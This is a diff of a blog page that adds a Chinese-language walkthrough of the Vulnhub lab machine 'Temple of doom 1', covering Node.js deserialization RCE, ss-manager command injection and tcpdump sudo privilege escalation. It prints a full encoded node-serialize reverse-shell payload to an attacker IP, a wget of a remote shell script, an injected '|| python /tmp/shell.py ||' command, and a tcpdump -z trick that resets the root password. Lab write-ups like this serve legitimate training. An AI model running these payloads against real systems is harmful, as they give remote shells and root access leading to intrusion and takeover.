@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: udf提权 | owefsad&#39;s blog</title>
+  <title>Vulnhub Challenging: Temple of doom 1 | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="owefsad&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/udf提权/index.html">
+  <meta name="description" content="思路 端口扫描, 整理思路 666端口, node rce ss-manager, 反弹shell tcpdump, get root">
+<meta name="keywords" content="node rce,序列化与反序列化,tcpdump提权,ss-manager命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Challenging: Temple of doom 1">
+<meta property="og:url" content="http://yoursite.com/2018/12/13/VUlnhub-Challenging-Temple-of-doom-1/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
+<meta property="og:description" content="思路 端口扫描, 整理思路 666端口, node rce ss-manager, 反弹shell tcpdump, get root">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://i1.bvimg.com/671004/88ec74175bf75b1a.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/708b360a7dcc2ab6.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/b1d5328e864e5068.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/afb9a352b20ec32f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/a77e4c1233e2a511.png">
+<meta property="og:updated_time" content="2018-12-13T05:14:29.925Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="owefsad&#39;s blog">
+<meta name="twitter:title" content="Vulnhub Challenging: Temple of doom 1">
+<meta name="twitter:description" content="思路 端口扫描, 整理思路 666端口, node rce ss-manager, 反弹shell tcpdump, get root">
+<meta name="twitter:image" content="http://i1.bvimg.com/671004/88ec74175bf75b1a.png">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -164,60 +175,124 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-VUlnhub-Challenging-Temple-of-doom-1" class="article article-type-post " itemscope="" itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/08/Vulnhub-Challenging-Raven/" class="archive-article-date">
-  	<time datetime="2018-12-08T02:30:13.393Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-08</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/08/Vulnhub-Challenging-Raven/">Vulnhub Challenging: Raven</a>
+    <h1 class="article-title" itemprop="name">
+      Vulnhub Challenging: Temple of doom 1
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/12/13/VUlnhub-Challenging-Temple-of-doom-1/" class="archive-article-date">
+  	<time datetime="2018-12-13T01:38:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>端口扫描, 整理思路</li>
+<li>666端口, node rce</li>
+<li>ss-manager, 反弹shell</li>
+<li>tcpdump, get root</li>
+</ul>
+<a id="more"></a>
+<h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><ul>
+<li>node反序列化导致RCE</li>
+<li>ss-manager任意命令执行</li>
+<li>tcpdump以root权限执行提权</li>
+</ul>
+<h3 id="端口扫描-整理思路"><a href="#端口扫描-整理思路" class="headerlink" title="端口扫描, 整理思路"></a>端口扫描, 整理思路</h3><p>拿到靶机ip之后，先扫描tcp的全端口确定渗透的方向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -Pn -p- -A 10.l29.10.51</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/88ec74175bf75b1a.png" alt="nmap"><br>22端口, OpenSSH 7.7 无问题, 只能爆破, 忽略<br>666端口, Node.js WEB前端框架, 各种漏洞 优先考虑</p>
+<h3 id="666端口-node-rce"><a href="#666端口-node-rce" class="headerlink" title="666端口, node rce"></a>666端口, node rce</h3><p>看到是node的WEB框架之后，第一直觉是找前端js中包含的接口, 尝试从接口中找到突破口; 结果发现没有js文件且第二次访问时爆json反序列化出错异常信息; 反序列化？RCE？<br>由于之前学习过反序列化相关文章, 因此直接拿出<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejsshell.py</a>生成RCE payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python nodejsshell.py 10.129.10.62 4444</span><br></pre></td></tr></table></figure></p>
+<p>将得到如下payload:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">54</span>,<span class="number">50</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">77</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">79</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">10</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">91</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">119</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">92</span>,<span class="number">110</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">46</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">44</span>,<span class="number">115</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">68</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">33</span>,<span class="number">92</span>,<span class="number">110</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">39</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">101</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">84</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">77</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">125</span>,<span class="number">10</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>))</span><br></pre></td></tr></table></figure></p>
+<p>用payload构造RCE, 写入cookie中执行, 获得反弹shell<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,50,57,46,49,48,46,54,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/708b360a7dcc2ab6.png" alt="node rce"></p>
+<p>其中, <code>_$$ND_FUNC$$_</code>是node serialize.js中的内建函数标志, 关于node rce的原理分析请看exploit-db的paper分析。</p>
+<h3 id="ss-manager-反弹shell"><a href="#ss-manager-反弹shell" class="headerlink" title="ss-manager, 反弹shell"></a>ss-manager, 反弹shell</h3><ol>
+<li>进入nodeadmin权限的shell后, 上传LinEnum.sh文件并收集可利用的信息, 结果并没有发现什么有用的信息(看来得增加一波功能了), 通过LinEnum.sh的反馈, 了解到内核、操作系统、计划任务提权都不可用</li>
+<li>既然内核、计划任务、sudo配置无漏洞, 开始考虑服务、文件、错误配置, 通过<code>ps -aux | grep &quot;&quot;</code>发现fireman用户运行了ss-manager进程, 此时开始考虑先切换到其他用户的账号下, 然后尝试getshell</li>
+<li>直接在google、searchsploit、exploit-db上搜索shadowsocks、ss-manager, 然后在exploit-db中用content搜索ss-manager时发现shadowsocks使用的libdev 3.1.0版本中存在本地命令执行漏洞<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载反弹shell</span></span><br><span class="line">$ wget http://10.129.10.62:8080/shell.py -O /tmp/shell.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行shell.py</span></span><br><span class="line">$ nc -u 127.0.0.1 8839</span><br><span class="line">add: &#123;<span class="string">"server_port"</span>:8005, <span class="string">"password"</span>:<span class="string">"test"</span>, <span class="string">"method"</span>:<span class="string">"|| python /tmp/shell.py ||"</span>&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>成功拿到fireman权限的反弹shell。<br>tips:</p>
+<ol>
+<li>ss-manager的功能: 接收ss配置, 然后调用ss-server根据配置运行对应的进程, 因此执行完上面的payload后, 会以fireman权限启动一个进程：<code>sh -c ss-server -m || python /tmp/shell.py || --manager-address 127.0.0.1:8839 -f /home/fireman/.shadowsoks/.shadowsocks_8005.pid -c /home/fireman/.shadowsocks/.shadowsocks_8005.conf -t 60 -s 0.0.0.0 --reuse-port</code>;</li>
+<li>如果在反弹的shell中执行一些阻塞进程的任务时, 将导致<code>python /tmp/shell.py</code>无法退出, 然后无法创建新的进程, 只能重启或以高权限杀死对应进程方可继续创建ss-server进程;</li>
+</ol>
+<h3 id="tcpdump-get-root"><a href="#tcpdump-get-root" class="headerlink" title="tcpdump, get root"></a>tcpdump, get root</h3><p>拿到fireman的shell后, 依旧是运行LinEnum.sh, 发现sudo -l的结果中有tcpdump命令, 尝试tcpdump获取shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写修改密码的shell文件</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">'(echo "owefsad123";sleep 1;echo "owefsad123")|passwd&gt;/dev/null'</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line"><span class="comment"># 增加文件可执行那个权限, 如果不指定权限会出现权限不足的错误</span></span><br><span class="line">$ chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line"><span class="comment"># tcpdump执行命令获取root密码</span></span><br><span class="line">$ sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure></p>
+<p>成功执行命令, 修改了root用户的密码<br><img src="http://i1.bvimg.com/671004/b1d5328e864e5068.png" alt="tcp dump"></p>
+<p>切换到root用户搜索靶机的flag<br><img src="http://i1.bvimg.com/671004/afb9a352b20ec32f.png" alt="su root"></p>
+<p>搜索flag文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find / -name <span class="string">"flag*"</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>读取flag<br><img src="http://i1.bvimg.com/671004/a77e4c1233e2a511.png" alt="read flag"></p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>node serialize.js 反序列化 rce</li>
+<li>shadowsocks libdev 3.1.0 命令执行</li>
+<li>tcpdump 4.0.0之后版本可执行命令导致提权(sudoers配置错误)</li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
